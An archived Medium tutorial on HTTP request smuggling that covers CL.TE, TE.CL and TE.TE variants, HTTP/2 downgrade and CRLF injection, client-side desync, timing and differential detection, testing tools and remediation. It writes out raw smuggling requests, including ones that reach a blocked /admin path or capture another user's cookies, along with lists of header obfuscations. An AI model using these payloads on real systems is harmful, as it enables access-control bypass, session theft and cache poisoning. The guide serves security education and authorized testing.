# 🐛 Bug Bounty Writeup

- **Source URL:** https://medium.com/@tanvir.infosec/http-request-smuggling-the-complete-guide-0a9a1d2d1c9f
- **Fetched from:** https://medium.com/@tanvir.infosec/http-request-smuggling-the-complete-guide-0a9a1d2d1c9f?source=rss-5825fa95dcd7------2
- **Fetched:** 2026-11-25
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/14909 (id 14909)
- **Method:** medium-rss-feed (full content:encoded) readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
- **Author/Published (RSS):** cyber security / Sat, 12 Sep 2026 18:28:16 GMT

HTTP Request Smuggling also known as **HTTP Desync** or **HTTP Header Smuggling** is one of the most dangerous vulnerabilities found in modern web infrastructure.

The vulnerability occurs when different components of a web application stack disagree about where one HTTP request ends and another begins.

In this deep dive, we’ll explore the major request-smuggling variants, detection techniques, HTTP/2 desynchronization, client-side desync, obfuscation techniques, real-world attack scenarios, security tools, and remediation strategies.

***Need professional security testing?***
[*Nexus Web Security*](https://nexuswebsecurity.com/) *provides professional* [***Penetration Testing & VAPT services***](https://nexuswebsecurity.com/security-service/vapt/) *to help organizations identify and address vulnerabilities in their web infrastructure.*

HTTP Request Smuggling occurs when a **front-end proxy** and a **back-end server** disagree about where an HTTP request ends and the next request begins.

A typical architecture looks like this:

Attacker

↓

Front-End Proxy / WAF / CDN

↓

Back-End Application Server

An attacker sends an ambiguous HTTP request.

The front-end may interpret it as **one request**, while the back-end interprets the same bytes as **two requests**.

The attacker can therefore “smuggle” a second request past security controls implemented at the front end.

Depending on the architecture, request smuggling can lead to:

The severity becomes particularly high when sensitive internal endpoints are protected only by the front-end layer.

The root cause is **inconsistent HTTP request parsing** between different components.

HTTP provides multiple ways of determining the length of a request body.

Content-Length: N

This tells the server that the request body contains exactly **N bytes**.

Transfer-Encoding: chunked

With chunked encoding, the body is divided into chunks, each preceded by its size in hexadecimal.

The body ends with a zero-length chunk.

The problem occurs when different systems use different rules to determine where the request ends.

For example:

Front-end → Content-Length

Back-end → Transfer-Encoding

The two systems may therefore disagree about which bytes belong to the first request.

Those leftover bytes can then be interpreted as the beginning of another request.

**CL.TE** means:

A simplified example:

POST / HTTP/1.1

Host: vulnerable-site.com

Content-Length: 13

Transfer-Encoding: chunked

0

SMUGGLED

The front-end reads the request according to Content-Length.

The back-end instead interprets the body using chunked encoding.

The back-end sees:

0\r\n\r\n

as the end of the chunked body.

The remaining bytes can remain in the connection buffer and potentially become part of the next request.

SMUGGLEDGET / HTTP/1.1

Host: vulnerable-site.com

In practical testing, the attacker generally crafts the smuggled data so that it forms a syntactically valid HTTP request.

POST / HTTP/1.1

Host: vulnerable-site.com

Content-Length: 31

Transfer-Encoding: chunked

GET /admin HTTP/1.1

X-Ignore: X

The additional header can be used to absorb headers belonging to the subsequent request.

**TE.CL** is the reverse configuration:

Example:

POST / HTTP/1.1

Host: vulnerable-site.com

Content-Length: 4

Transfer-Encoding: chunked

5c

GET /admin HTTP/1.1

X-Ignore: X

The front-end processes the request as a chunked message.

The back-end instead follows the Content-Length value.

The resulting disagreement can leave bytes in the connection buffer.

Those bytes may subsequently be interpreted as a new HTTP request:

An important detail during authorized testing is that **chunk sizes are hexadecimal**, and payload lengths must be calculated precisely.

In **TE.TE** scenarios, both systems support Transfer-Encoding, but one parser can potentially be tricked into ignoring it.

This can effectively turn the situation into either CL.TE or TE.CL behavior.

One example is duplicate Transfer-Encoding headers:

POST / HTTP/1.1

Host: vulnerable-site.com

Content-Length: 4

Transfer-Encoding: chunked

Transfer-Encoding: xchunked

Different HTTP stacks may handle duplicate or malformed headers differently.

Therefore, authorized security assessments should test parser behavior systematically rather than assuming every server interprets the request identically.

Some HTTP stacks process the **first** Content-Length header while others process the **last**.

POST / HTTP/1.1

Host: vulnerable-site.com

Content-Length: 6

Content-Length: 30

If the front-end uses one value and the back-end uses another, the two systems can become desynchronized.

Duplicate Transfer-Encoding headers can create similar inconsistencies:

Transfer-Encoding: chunked

Transfer-Encoding: identity

Legacy values such as identity may also cause different implementations to make different parsing decisions.

Detection generally involves observing differences in how front-end and back-end systems process specially crafted requests.

Two useful approaches are:

A deliberately malformed or ambiguous request may cause one component to wait for additional data.

POST / HTTP/1.1

Host: target.com

Content-Length: 30

Transfer-Encoding: chunked

GET / HTTP/1.1

X-Ignore: X

If one component waits for additional data, the connection may exhibit an unusual delay.

Timing behavior should be interpreted carefully because network latency, connection pooling, and server-side processing can also cause delays.

Another technique is to send a request designed to produce an easily recognizable response if it reaches the back-end as a separate request.

POST / HTTP/1.1

Host: target.com

Content-Length: 33

Transfer-Encoding: chunked

GET /404 HTTP/1.1

X-Ignore: X

A subsequent normal request can then be compared against the expected response.

An unexpected 404, delay, connection reset, or other response difference may indicate desynchronization.

Once a request-smuggling condition has been confirmed in an authorized assessment, several classes of impact may be possible.

Suppose /admin is blocked by a front-end access-control layer.

A desynchronized request may cause the front-end to process an apparently harmless request while the back-end receives a different request.

Conceptually:

Front-end sees:

POST /

Back-end receives:

GET /admin

This can become an access-control bypass if the back-end does not independently enforce authorization.

Another potential impact is using a smuggled request to cause a subsequent user’s request to be interpreted as data.

A victim’s request might contain:

GET / HTTP/1.1

Host: target.com

Cookie: session=...

If the architecture allows the victim’s request to be consumed by an attacker-controlled request, sensitive headers may potentially be exposed.

Depending on the environment, this could include:

Request smuggling can sometimes be combined with request reflection.

The attacker attempts to position a smuggled request so that the next request arriving on the affected connection becomes part of the attacker-controlled request.

The potential result is exposure of another user’s request data.

This is particularly serious when authentication cookies or other sensitive headers are involved.

Request smuggling can also be combined with cache behavior.

A malicious request may cause a cacheable response to become associated with a URL that subsequent users request.

Potential consequences include:

The exact impact depends heavily on how the cache constructs its cache key and how the back-end generates responses.

Another possibility is **web cache deception**.

An attacker may attempt to make a cache treat an authenticated resource as though it were a public static resource.

GET /account/profile.css HTTP/1.1

If the back-end returns authenticated data while the cache incorrectly considers the response publicly cacheable, sensitive information could potentially become accessible through a cacheable URL.

Desynchronization can also corrupt connection pools.

Half-formed or malformed requests may cause subsequent requests to be processed incorrectly.

In some architectures, this can result in:

Modern infrastructure frequently uses HTTP/2 between clients and CDNs while communicating with back-end servers over HTTP/1.1.

This creates an important attack surface:

Browser

↓ HTTP/2

CDN / Proxy

↓ HTTP/1.1

Origin Server

HTTP/2 itself does not use the same Content-Length versus Transfer-Encoding ambiguity because the DATA frames define the message boundaries.

However, problems can reappear during **HTTP/2 → HTTP/1.1 downgrading**.

Duplicate content-length values may create inconsistencies in implementations that handle them differently.

:method: POST

:path: /

content-length: 0

content-length: 61

If different components interpret these values differently, request boundaries can become inconsistent.

HTTP/2 does not permit normal use of Transfer-Encoding: chunked.

Therefore, an HTTP/2 front-end that improperly forwards such a header during conversion can create a dangerous parsing situation at the HTTP/1.1 origin.

Another class of problems involves insufficient validation of header values.

If a component allows CRLF characters inside a header value, an attacker may attempt to inject additional HTTP syntax.

header-name: x

header-value: x\r\n\r\nGET /admin HTTP/1.1

This is why strict header validation is important at every HTTP boundary.

**Client-Side Desync (CSD)** shifts the desynchronization problem from the traditional proxy-to-origin relationship into the victim’s browser connection.

The general concept is:

Attacker-controlled response

↓

Victim browser connection becomes desynchronized

↓

Victim's subsequent request is affected

A simplified browser request may look like:

```
fetch('https://target.com/', {
  method: 'POST',
  headers: {
    'Content-Length': '4'
  },
  body: 'X' + ' '
});
```
Under vulnerable conditions, the browser’s subsequent request may be interpreted incorrectly by the server-side infrastructure.

One related class is **CL.0 desynchronization**, where a server ignores a request body under certain conditions.

Because client-side desync can involve a victim’s authenticated browser session, its impact can be significant.

Different HTTP implementations may parse malformed or unusual headers differently.

Potential areas to test during an authorized assessment include:

Transfer-Encoding: xchunked

Transfer-Encoding : chunked

Transfer-Encoding: chunked\r

Transfer-Encoding: chunked\t

Transfer-Encoding: x

Transfer-Encoding: identity, chunked

TRANSFER-ENCODING: chunked

Transfer-Encoding: chunked

Transfer-Encoding: x

Transfer-Encoding: chunked, chunked

Additional variations can involve:

Examples include:

Content-Length: 5x

Content-Length: 0x05

Content-Length: +5

Content-Length: 05

Content-Length: 5, 5

Content-Length: 5

Content-Length: 30

Content-Length : 5

Content-length: 5

Legacy header folding can also produce parser inconsistencies:

Content-Length: 5\r\n

(continued) Transfer-Encoding: chunked

Modern HTTP specifications deprecate obsolete line folding, but inconsistent implementations can still create unexpected behavior.

Other headers may influence how intermediaries process requests:

Connection: keep-alive, Transfer-Encoding

Connection: transfer-encoding, content-length

X-HTTP-Version

X-HTTP-Method-Override

During an authorized assessment:

Several tools can assist security professionals during authorized testing.

Burp Suite provides request manipulation capabilities and extensions designed specifically for HTTP request-smuggling research.

A Python-based tool that can test multiple request-smuggling variations.

A standalone tool designed to assist with request-smuggling testing.

Useful for sending high-volume or carefully synchronized HTTP requests during advanced testing.

Focused on HTTP/2 cleartext upgrade scenarios involving h2c.

Manual testing remains important.

Burp Repeater can be used with persistent connections and carefully controlled request sequences to understand how the target infrastructure parses requests.

HTTP request smuggling has been the subject of extensive security research.

James Kettle’s 2019 research demonstrated the practical security impact of HTTP desynchronization across major web infrastructure components.

His research helped popularize systematic techniques for identifying CL.TE, TE.CL, and related desynchronization vulnerabilities.

The broader history of HTTP desynchronization research includes vulnerabilities and security fixes affecting technologies such as:

Examples referenced in the source material include:

The exact impact and affected versions should always be verified against the relevant vendor advisory before making a vulnerability claim.

The best defense is to eliminate parsing ambiguity between every component in the request-processing chain.

Do not allow requests containing both:

Content-Length

and:

Transfer-Encoding

when your architecture does not explicitly support the combination.

Reject ambiguous requests with an appropriate client error response.

Strictly validate Transfer-Encoding.

Reject:

End-to-end HTTP/2 can reduce certain HTTP/1.1 parsing ambiguities.

However, HTTP/2 downgrade boundaries still need careful security testing.

Use consistent and well-maintained versions of:

The fewer parsing differences between components, the smaller the attack surface.

Where appropriate, close or reset connections after detecting malformed or ambiguous requests.

This helps prevent poisoned persistent connections from affecting subsequent requests.

If HTTP/2 cleartext upgrades are not required, disable them at the edge.

CDNs, reverse proxies, and WAFs should use strict request parsing and normalization where available.

Security monitoring should identify suspicious patterns such as:

HTTP Request Smuggling is frequently missed by conventional vulnerability scanners because exploitation depends on the behavior of **multiple components working together**.

For organizations using CDNs, WAFs, reverse proxies, load balancers, and application servers, request-smuggling testing should be considered as part of a comprehensive VAPT program.

TestPayload PatternPossible Positive SignalCL.TE timingCL + TE with terminating chunk + controlled dataUnexpected delayTE.CL timingCL + TE with controlled bodyUnexpected delayCL.TE differentialSmuggled /404 requestUnexpected 404TE.CL differentialChunked smuggled /404Unexpected 404Obfuscated TETE variations combined with CLDelay or differential responseH2.CLDuplicate content-lengthDifferential response or delayH2.TEtransfer-encoding in HTTP/2Differential response or delayCRLF injectionCRLF inside header valueUnexpected parsing behaviorCL.0 / CSDBody on a route that ignores itBrowser-side desynchronization

HTTP Request Smuggling is fundamentally a **parser synchronization problem**.

The vulnerability appears when different layers of a modern web architecture disagree about how HTTP requests should be interpreted.

The most important lesson is that securing only the front-end is not enough.

A modern application may involve:

Browser

↓

CDN

↓

WAF

↓

Load Balancer

↓

Reverse Proxy

↓

Web Server

↓

Application

Every transition between these components can potentially introduce parsing inconsistencies.

Organizations should therefore test the **entire request-processing chain**, not just the application itself.

***Security testing should always be performed only against systems you own or have explicit authorization to assess.***

If your organization operates a production web application, API, CDN, WAF, or complex proxy architecture, a professional VAPT assessment can help identify request-smuggling, desynchronization, cache-poisoning, and other weaknesses before attackers discover them.

[**Nexus Web Security**](https://nexuswebsecurity.com/) provides professional penetration testing and VAPT services focused on identifying real-world security weaknesses and explaining their business impact in clear, actionable terms.

**We hack to protect.**
